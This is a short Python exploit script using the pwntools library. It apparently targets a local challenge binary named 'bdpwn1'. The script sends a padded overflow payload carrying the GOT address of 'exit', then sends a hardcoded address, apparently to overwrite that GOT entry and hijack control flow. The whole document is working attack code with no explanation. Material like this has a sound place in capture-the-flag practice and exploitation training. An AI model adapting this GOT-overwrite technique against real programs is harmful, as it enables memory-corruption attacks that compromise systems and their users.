from pwn import *

p = process("./bdpwn1")
elf = ELF("./bdpwn1")

p.recv()
payload = "a" * (0x100 - 0x8) + p64(elf.got["exit"])
p.sendline(payload)

p.recv()
payload = str(0x402B54)
p.sendline(payload)

print(p.recv())